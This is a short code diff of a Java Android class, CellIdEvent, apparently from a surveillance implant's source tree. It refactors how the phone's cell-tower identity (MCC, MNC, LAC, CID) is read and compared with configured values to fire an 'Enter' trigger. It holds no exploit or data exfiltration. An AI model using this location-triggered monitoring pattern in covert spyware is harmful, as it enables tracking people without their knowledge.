@@ -9,6 +9,7 @@ import android.telephony.cdma.CdmaCellLocation;
 import android.telephony.gsm.GsmCellLocation;
 import android.util.Log;
 
+import com.ht.RCSAndroidGUI.CellInfo;
 import com.ht.RCSAndroidGUI.Device;
 import com.ht.RCSAndroidGUI.Status;
 import com.ht.RCSAndroidGUI.utils.Check;
@@ -68,72 +69,15 @@ public class CellIdEvent extends EventBase {
 
 	@Override
 	public void go() {
-		int mcc = -1;
-		int mnc = -1;
-		int lac = -1;
-		int cid = -1;
-
-		android.content.res.Configuration conf = Status.getAppContext()
-				.getResources().getConfiguration();
-		TelephonyManager tm = (TelephonyManager) Status.getAppContext()
-				.getSystemService(Context.TELEPHONY_SERVICE);
-
-		CellLocation bcell = tm.getCellLocation();
-
-		if (bcell == null) {
-			Log.d(TAG, "Error: " + "null cell");
-			return;
+		CellInfo info = Device.getCellInfo();
+		if(!info.valid){
+			Log.d(TAG,"Error: " + "invalid cell info" );
 		}
-
-		if (bcell instanceof GsmCellLocation) {
-			Check.asserts(Device.isGprs(), "gprs or not?");
-			GsmCellLocation cell = (GsmCellLocation) bcell;
-
-			// Integer.parseInt(Integer.toHexString(conf.mcc));
-			mcc = conf.mcc;
-
-			mnc = conf.mnc;
-			lac = cell.getLac();
-			cid = cell.getCid();
-
-			final StringBuffer mb = new StringBuffer();
-			mb.append("MCC: " + mcc);
-			mb.append(" MNC: " + mnc);
-			mb.append(" LAC: " + lac);
-			mb.append(" CID: " + cid);
-
-			Log.d(TAG, "info: " + mb.toString());
-
-		}
-
-		if (bcell instanceof CdmaCellLocation) {
-			Check.asserts(Device.isCdma(), "cdma or not?");
-			CdmaCellLocation cell = (CdmaCellLocation) tm.getCellLocation();
-
-			// CDMAInfo.getIMSI()
-			final int sid = cell.getSystemId();
-			final int nid = cell.getNetworkId();
-			final int bid = cell.getBaseStationId();
-			// https://www.blackberry.com/jira/browse/JAVAAPI-641
-			mcc = 0;
-
-			final StringBuffer mb = new StringBuffer();
-			mb.append("SID: " + sid);
-			mb.append(" NID: " + nid);
-			mb.append(" BID: " + bid);
-
-			Log.d(TAG, "info: " + mb.toString());
-
-			mnc = sid;
-			lac = nid;
-			cid = bid;
-
-		}
-
-		if ((mccOrig == -1 || mccOrig == mcc)
-				&& (mncOrig == -1 || mncOrig == mnc)
-				&& (lacOrig == -1 || lacOrig == lac)
-				&& (cidOrig == -1 || cidOrig == cid)) {
+		
+		if ((mccOrig == -1 || mccOrig == info.mcc)
+				&& (mncOrig == -1 || mncOrig == info.mnc)
+				&& (lacOrig == -1 || lacOrig == info.lac)
+				&& (cidOrig == -1 || cidOrig == info.cid)) {
 			if (!entered) {
 				Log.d(TAG, "Enter");
 				entered = true;
